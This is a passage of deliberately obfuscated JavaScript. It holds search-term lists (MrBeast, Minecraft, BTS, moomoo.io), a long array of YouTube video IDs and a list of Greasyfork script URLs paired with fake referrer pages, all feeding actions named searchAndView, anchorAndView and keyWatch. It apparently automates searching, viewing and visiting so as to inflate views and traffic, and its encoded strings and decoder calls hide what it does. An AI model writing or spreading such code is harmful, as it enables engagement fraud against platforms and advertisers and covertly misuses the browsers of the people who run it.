'\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x19 * 0x33 + 0x1a34 + -0x152f)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x16c8 + -0xa9e + -0x2 * -0x10b8)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + S(0x12) + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x219e + -0x2 * -0xf76 + 0x2b5);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    T(0x11) + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    S(0x4) + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    T(0x2) + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    U(0x14, 'Q$3U') + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    T(0xa) + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    T(0x13) + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    U(0x1, 'VfaT') + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + S(0x5) + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + U(0x16, '*t^A') + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': T(0x9) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': S(0x15) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': S(0x15) + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + U(0x0, 'Vyb6') + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + U(0xf, 'ARv8') + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
